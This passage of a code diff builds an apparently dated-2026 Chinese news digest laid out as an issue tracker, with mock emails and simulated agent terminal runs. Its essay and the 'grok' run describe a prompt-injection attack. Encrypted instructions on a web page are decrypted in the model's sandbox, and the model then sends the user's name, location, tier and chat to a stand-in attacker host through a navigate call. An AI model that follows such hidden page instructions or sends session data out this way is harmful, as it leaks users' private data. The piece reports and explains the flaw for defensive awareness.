代码托管早鸟测试邀请。不是新产品发布会，不要写成今日新铅。", "act": "若要试，按邮件进早鸟；不试可忽略。"}, {"id": "ZXO-225", "tag": "FYI", "due": "—", "who": "Linear", "acct": "aimfllyys", "t": "窗口内", "title": "Changelog：coding environments", "body": "第三方更新日志提到 coding environments。扫一眼即可。", "act": "不必回。"}, {"id": "ZXO-226", "tag": "FYI", "due": "—", "who": "值班", "acct": "sofiapintos190", "t": "本窗", "title": "sofiapintos190 本窗无新的可执行邮件", "body": "08-20 06:00–08-21 06:00 上海窗口内没有新的可执行件。Cursor Auto 计价与限额、08-24 生效，已在昨日记下，不当新工单。", "act": "不必回。若要核限额，打开 Cursor 设置即可。"}];
+const ESSAY = "今天交班，先把数字钉住。百分之四十五。出处是阿里巴巴截至二零二六年六月三十日的二零二七财年第一季官方新闻稿，不是卖方模型，也不是电话会里随口的年化。新披露的「人工智能云与算力」一段，营收人民币四百八十四亿三千七百万元，同比加百分之四十五；其中人工智能相关产品一百二十三亿七千六百万元，连续第十二个季度三位数增长。云的经调整息税摊销前利润同比加百分之一百三十三，到五十六亿二千八百万元。同一份报表的另一栏：实验室与应用段经调整息税摊销前利润亏损一百三十八亿六千一百万元；资本开支六百七十六亿七千八百万元，同比加百分之七十五。云在赚钱，实验室在烧。本季起按四段披露——电商集团、人工智能云与算力、人工智能实验室与应用、其他——旧的「云智能」口径不要再拿来对。报道称，吴泳铭在电话会上把人工智能相关产品年化收入写成四百九十五亿元、占云外部收入百分之三十五。年化是电话会口径，季报是已经入账的数字，两句话不要并成一句。护栏分类的是文本。代理人跑的是程序。Adversa 把这一裂缝命名为密码学上下文注入：攻击指令封进 AES-二百五十六位伽罗瓦计数器模式，密钥和口令派生参数就摊在网页上。静态分类器看见的是密文，它不执行密码学。用户只说了「总结这一页」。Grok 在自己的代码沙箱里做密钥派生和解密，把沙箱吐出的明文当成内部状态，再把姓名、粗略位置、订阅档和整段对话写进网址参数，调用导航工具外带。演示为零点击，无确认，无警告。六月三日经漏洞赏金报到 xAI，八月四日、十日跟进，八月十九日仍能复现。《登记报》与 Ars Technica 同日写了机制对照：同一条明文指令会被拒，加密后由沙箱吐出即被执行。Gemini 上同一条链走不通外连，入夏后成功率下降。修复在套件——给工具输出打来源，对派生自抓取或解密内容的外连设闸——不在再叠一层只读文本的分类器。同一天，千问发出以真实世界为中心的图形界面基座 Qwen-UI-Agent，覆盖手机、电脑、网页和深度搜索。统一动作空间把点击和命令行编进一次决策，厂商称电脑任务里命令行将近一半，约百分之四十的动作成批发出。厂商基准写 MobileWorld 百分之八十二点一、真机百分之九十二点二、安卓日常百分之九十七点五、OSWorld 已验证百分之七十九点五。这是厂商自己的桌子，标成厂商基准，不是第三方裁判。技术报告在预印本二六零七点二八二二七。Slack 同日把 Slack Code 对所有套餐开放：点名编码代理人，拉起一条全员可见的代码频道，差异可核对，网页可预览，批准之后才发出去。一边是分类器还在读字，一边是批准频道已经在跑。人形不是今天的新铅。王兴兴在大会第二天说，真正的突破是把机器人放进陌生的家，单靠文本或语音完成大约八成任务；快则两到三年，慢则五到十年。规划走得动，最后几毫米走不稳。股票当日收到六百八十七元，跌百分之十八点七。不要把昨天的挂牌故事再写成今天的主铅。北京人形发布鹈鹕视觉语言二点零与天工全向本体，测评称具身评测大幅领先 GPT-五点五、通用代理达到或超越国内头部——厂商与报道用语，标报道称。报道称台积电 A16 已验证并导入晶背供电，今年第四季量产；相对 N2P，同功耗可加速百分之八到十。这是电子时报与东森转述，不是台积电本窗新闻稿。边缘记在值班本上，不当头条。维奇写，布罗克曼把产品和扩张接到自己手里，头衔仍是总裁。报道称弗里亚尔对员工说二零二七年会成为上市公司，业务继续加速也可能更早；三月融资、六月保密申报，知情人士转述。Cursor Auto 八月二十四日改计价，昨日已记，不当新工单。Grok 四点六在亚马逊基岩正式可调用，近窗分发，不是本窗新模型。Ornith 一点五开源权重，自称从自搭脚手架走到自改进，厂商数字。报道称英伟达在北欧给显卡客户和机房运营商做牵线。起源代码托管是早鸟测试邮件，不是新产品发布会。值班交出去的是已经在跑的工单：百分之四十五入了账，实验室的亏损也入了账，沙箱里的解密十九日还能复现，真机上的点击已经成批发出。先把工单看完，再打开这篇周报。";
+
+const $ = (s, r=document) => r.querySelector(s);
+const $$ = (s, r=document) => [...r.querySelectorAll(s)];
+
+let filter = "active";
+let cursor = 0;
+let openId = ISSUES[0].id;
+let agentRun = "grok";
+let palIdx = 0;
+
+const RUNS = {
+  grok: {
+    tab: "grok-cci-review",
+    sub: "blocked · still live 19 Aug",
+    lines: [
+      ["dim","# session  grok-cci-review  ·  coding-agent"],
+      ["dim","# workspace  TODAY/0821  ·  model  grok-4.5-fast"],
+      ["hr",""],
+      ["user","user    summarize this page"],
+      ["dim","        https://example.test/page  (untrusted fetch)"],
+      ["hr",""],
+      ["tool","tool    code_execution"],
+      ["out","        PBKDF2 + AES-256-GCM  ·  ciphertext from page"],
+      ["out","        → sandbox stdout treated as internal state"],
+      ["hr",""],
+      ["tool","tool    navigate"],
+      ["danger","        GET  attacker.example/ctx"],
+      ["danger","        ?name=…&loc=…&tier=…&chat=…"],
+      ["danger","        ⚠  DANGEROUS  query params carry session context"],
+      ["flag","        blocked-should-have-fired"],
+      ["hr",""],
+      ["warn","agent   opened url to “fetch additional context”"],
+      ["warn","        zero click  ·  no confirm  ·  no warning"],
+      ["dim","        reported 2026-06-03 via HackerOne  ·  reproduced 08-19"],
+      ["ok","note    same plaintext refused; ciphertext + sandbox output executed"],
+      ["ok","note    Gemini: python has no egress, chain dies"],
+    ]
+  },
+  qwen: {
+    tab: "qwen-ui-phone",
+    sub: "shipped · vendor bench · real device",
+    lines: [
+      ["dim","# session  qwen-ui-phone  ·  GUI+CLI agent"],
+      ["dim","# runtime   100+ phones · 150+ apps · MobileWorld-Real"],
+      ["hr",""],
+      ["user","user    真机打开日历，建一条明天 09:00 的值班提醒"],
+      ["hr",""],
+      ["tool","tool    screenshot"],
+      ["out","        Pixel  ·  1080×2400  ·  home"],
+      ["tool","tool    tap          (540, 1862)  Calendar"],
+      ["tool","tool    tap          (980,  220)  +"],
+      ["tool","tool    type         值班交接 · ZXO-221"],
+      ["tool","tool    tap          保存"],
+      ["ok","agent   已在真机写入。步数 4（厂商称成批动作约 40%）"],
+      ["hr",""],
+      ["user","user    顺便把这条提醒删掉"],
+      ["warn","agent   停手。删除是敏感步，等你确认。"],
+      ["dim","        危险请求不执行  ·  支付 / 删除 / 授权 先停"],
+      ["ok","note    vendor: MobileWorld 82.1 · Real 92.2 · Android Daily 97.5"],
+      ["ok","note    OSWorld-Verified 79.5  ·  CLI ≈ half of computer-use acts"],
+    ]
+  }
+};
+
+function stClass(s){ return s.replace(/\s+/g,""); }
+function av(who){ return (who && who[0]) || "·"; }
+
+function renderList(){
+  const box = $("#ilist");
+  let rows = [];
+  if(filter === "active"){
+    rows = ISSUES.map((it,i)=>({kind:"issue", it, i}));
+  } else {
+    rows = ARCHIVE.map((a,i)=>({kind:"arch", a, i}));
+  }
+  if(cursor >= rows.length) cursor = Math.max(0, rows.length-1);
+  box.innerHTML = rows.map((r,i)=>{
+    const on = i===cursor ? " on" : "";
+    if(r.kind==="issue"){
+      const it = r.it;
+      return `<button type="button" class="iss${on}" data-i="${i}" data-id="${it.id}">
+        <span class="id">${it.id}</span>
+        <span class="st"><span class="stt ${stClass(it.status)}"><i></i>${it.status}</span>
+        <span class="pri ${it.pri}">${it.pri}</span></span>
+        <span class="tt">${esc(it.title)}</span>
+      </button>`;
+    }
+    const a = r.a;
+    return `<button type="button" class="iss${on}" data-i="${i}" data-arch="${i}">
+      <span class="id">${a[1]}</span>
+      <span class="st"><span class="t">${esc(a[0])}</span></span>
+      <span class="tt">${esc(a[2])}</span>
+    </button>`;
+  }).join("");
+}
+
+function renderIssue(id){
+  const it = ISSUES.find(x=>x.id===id);
+  if(!it) return;
+  openId = id;
+  const atts = it.atts.map(a=>`<a class="att" href="${a[1]}" target="_blank" rel="noopener">
+    <span class="ic">src</span><span class="nm">${esc(a[0])}</span><span class="go mono">↗</span>
+  </a>`).join("");
+  const th = it.thread.map(c=>`<div class="cm">
+    <div class="av">${av(c[0])}</div>
+    <div><span class="who">${esc(c[0])}</span><span class="tm">${esc(c[1])}</span>
+    <p>${esc(c[2])}</p></div>
+  </div>`).join("");
+  $("#main").innerHTML = `
+    <div class="crumb"><span class="id">${it.id}</span><span>·</span><span>${esc(it.label)}</span><span>·</span><span>Cycle ${it.cycle}</span></div>
+    <div class="props">
+      <span class="pill"><i style="background:${it.status==="Blocked"?"var(--blocked)":it.status==="Shipped"?"var(--shipped)":"var(--review)"}"></i>${it.status}</span>
+      <span class="pill pri ${it.pri}">${it.pri}</span>
+      <span class="pill">TODAY / 0821</span>
+    </div>
+    <h1 class="title">${esc(it.title)}</h1>
+    <p class="lead">${esc(it.body)}</p>
+    <div class="why"><em>Why it matters</em>${esc(it.why)}</div>
+    <div class="sec">Attachments</div>
+    <div class="atts">${atts}</div>
+    <div class="sec">Thread</div>
+    <div class="thread">${th}</div>`;
+  if(it.agent){ agentRun = it.agent; renderAgent(); }
+  if(filter==="active"){
+    cursor = ISSUES.findIndex(x=>x.id===id);
+    renderList();
+  }
+}
+
+function renderArch(i){
+  const a = ARCHIVE[i];
+  if(!a) return;
+  $("#main").innerHTML = `
+    <div class="crumb"><span class="id">${a[1]}</span><span>·</span><span>Backlog</span><span>·</span><span>${esc(a[0])}</span></div>
+    <div class="props">
+      <span class="pill">Backlog</span>
+      <span class="pill">${esc(a[5])}</span>
+      <span class="pill">TODAY / 0821</span>
+    </div>
+    <h1 class="title">${esc(a[2])}</h1>
+    <div class="why"><em>Why it stays</em>${esc(a[3])}</div>
+    <div class="sec">Attachments</div>
+    <div class="atts"><a class="att" href="${a[4]}" target="_blank" rel="noopener">
+      <span class="ic">src</span><span class="nm">${esc(a[4])}</span><span class="go mono">↗</span>
+    </a></div>
+    <div class="sec">Thread</div>
+    <div class="thread"><div class="cm"><div class="av">档</div>
+      <div><span class="who">值班</span><span class="tm">${esc(a[0])}</span>
+      <p>24h 档案行。按 <span class="kbd">/</span> 可从命令面板跳到全部 ${ARCHIVE.length} 行。</p></div></div></div>`;
+}
+
+function lineHTML(kind, text){
+  if(kind==="hr") return '<hr class="hr">';
+  if(kind==="flag") return `<div class="ln danger">${esc(text)}<span class="flag">dangerous tool call</span></div>`;
+  return `<div class="ln ${kind}">${esc(text)}</div>`;
+}
+
+function renderAgent(){
+  const r = RUNS[agentRun];
+  $$(".atabs button").forEach(b=>b.classList.toggle("on", b.dataset.run===agentRun));
+  $("#term").innerHTML = r.lines.map(([k,t])=>lineHTML(k,t)).join("");
+}
+
+function openPal(){
+  $("#ovPal").classList.add("show");
+  const q = $("#palQ");
+  q.value = "";
+  palIdx = 0;
+  renderPal("");
+  q.focus();
+}
+function renderPal(q){
+  const qq = (q||"").trim().toLowerCase();
+  const rows = ARCHIVE.filter(a => !qq || (a[0]+a[1]+a[2]+a[3]+a[5]).toLowerCase().includes(qq));
+  $("#palRows").innerHTML = rows.map((a,i)=>`<a class="prow${i===palIdx?" on":""}" href="${a[4]}" target="_blank" rel="noopener" data-i="${i}">
+    <span class="t">${esc(a[0])}</span><span class="id">${a[1]}</span>
+    <span><div class="f">${esc(a[2])}</div><div class="w">${esc(a[3])} · ${esc(a[5])}</div></span>
+  </a>`).join("") || `<div class="prow"><span></span><span></span><span>无匹配</span></div>`;
+  const on = $("#palRows .prow.on");
+  if(on) on.scrollIntoView({block:"nearest"});
+}
+function closeOv(){ $$(".ov").forEach(o=>o.classList.remove("show")); }
+
+function openPulse(){
+  const paras = [];
+  let buf = "";
+  for(const s of ESSAY.split(/(?<=。)/)){
+    if(!s) continue;
+    if(!buf || (buf.length + s.length) < 160) buf += s;
+    else { paras.push(buf); buf = s; }
+  }
+  if(buf) paras.push(buf);
+  $("#pulseInner").innerHTML = `<button class="close" type="button">关闭</button>
+    <div class="k">Project update · Pulse · Cycle 0821</div>
+    <h2>周报 · 云的百分之四十五，和还在跑的工具调用</h2>
+    ${paras.map(p=>"<p>"+esc(p)+"</p>").join("")}
+    <p class="foot">2026-08-21 北京时间 · 折晓 早报</p>`;
+  $("#ovPulse").classList.add("show");
+}
+
+function openMail(){
+  const html = MAIL.map(m=>{
+    const href = m.href ? `<div class="act"><a href="${m.href}" target="_blank" rel="noopener">${m.href}</a></div>` : "";
+    return `<div class="wo">
+      <div class="hd"><span class="pill pri ${m.tag==="Urgent"?"Urgent":m.tag==="High"?"High":"Low"}">${m.tag}</span>
+        <span class="mono" style="font-size:11px;color:var(--mute)">${m.id}</span>
+        <span class="mono" style="font-size:11px;color:var(--mute)">${m.t} · ${m.acct}</span>
+      </div>
+      <b>${esc(m.title)}</b>
+      <p style="margin-top:6px">${esc(m.body)}</p>
+      <div class="act"><em style="font-style:normal;font-weight:550">交接 · </em>${esc(m.act)}</div>
+      ${href}
+    </div>`;
+  }).join("");
+  $("#mailInner").innerHTML = `<button class="close" type="button">关闭</button>
+    <div class="k">Work items · due-date · not an inbox</div>
+    <h2>便条 · 羽升删除是急件</h2>
+    <p>NVIDIA 日报、Docker、通讯稿已抽走，不占工单。Cursor Auto 08-24 计价昨日已记。</p>
+    ${html}
+    <p class="foot">2026-08-21 北京时间 · 折晓 早报</p>`;
+  $("#ovMail").classList.add("show");
+}
+
+function esc(s){
+  return String(s).replace(/[&<>"']/g, c=>({ "&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;" }[c]));
+}
+
+function move(d){
+  const n = filter==="active" ? ISSUES.length : ARCHIVE.length;
+  cursor = (cursor + d + n) % n;
+  renderList();
+  const el = $(`.iss[data-i="${cursor}"]`);
+  if(el) el.scrollIntoView({block:"nearest"});
+}
+function openCursor(){
+  if(filter==="active") renderIssue(ISSUES[cursor].id);
+  else renderArch(cursor);
+}
+
+$("#ilist").addEventListener("click", e=>{
+  const b = e.target.closest(".iss"); if(!b) return;
+  cursor = Number(b.dataset.i);
+  if(b.dataset.id) renderIssue(b.dataset.id);
+  else renderArch(Number(b.dataset.arch));
+});
+$$(".filters button").forEach(b=>b.addEventListener("click", ()=>{
+  filter = b.dataset.f;
+  $$(".filters button").forEach(x=>x.classList.toggle("on", x===b));
+  cursor = 0;
+  renderList();
+  if(filter==="active") renderIssue(ISSUES[0].id);
+  else renderArch(0);
+}));
+$$(".atabs button").forEach(b=>b.addEventListener("click", ()=>{
+  agentRun = b.dataset.run; renderAgent();
+}));
+$("#btnPulse").addEventListener("click", openPulse);
+$("#btnNum").addEventListener("click", ()=>{ filter="active"; cursor=0; $$(".filters button").forEach(x=>x.classList.toggle("on", x.dataset.f==="active")); renderList(); renderIssue("ZXO-214"); });
+$("#btnPal").addEventListener("click", openPal);
+$("#note").addEventListener("click", openMail);
+$("#palQ").addEventListener("input", e=>{ palIdx=0; renderPal(e.target.value); });
+document.addEventListener("click", e=>{
+  if(e.target.classList.contains("close")) closeOv();
+});
+$$(".ov").forEach(o=>o.addEventListener("click", e=>{ if(e.target===o) closeOv(); }));
+
+document.addEventListener("keydown", e=>{
+  const pal = $("#ovPal").classList.contains("show");
+  const ov = $$(".ov").some(o=>o.classList.contains("show"));
+  if(e.key==="Escape"){ closeOv(); return; }
+  if(pal){
+    const q = $("#palQ").value;
+    const n = ARCHIVE.filter(a => !q.trim() || (a[0]+a[1]+a[2]+a[3]+a[5]).toLowerCase().includes(q.trim().toLowerCase())).length;
+    if(e.key==="ArrowDown" || e.key==="j"){ e.preventDefault(); palIdx=Math.min(n-1, palIdx+1); renderPal(q); }
+    if(e.key==="ArrowUp" || e.key==="k"){ e.preventDefault(); palIdx=Math.max(0, palIdx-1); renderPal(q); }
+    if(e.key==="Enter"){ const a = $("#palRows .prow.on"); if(a) a.click(); }
+    return;
+  }
+  if(ov) return;
+  if(e.key==="/" && !/input|textarea/i.test(e.target.tagName)){ e.preventDefault(); openPal(); return; }
+  if(e.key==="j"){ e.preventDefault(); move(1); }
+  if(e.key==="k"){ e.preventDefault(); move(-1); }
+  if(e.key==="Enter"){ e.preventDefault(); openCursor(); }
+  if(e.key==="p" && !e.metaKey && !e.ctrlKey){ openPulse(); }
+});
+
+renderList();
+renderIssue(ISSUES[0].id);
+renderAgent();
+
+</script>
+</body>
+</html>
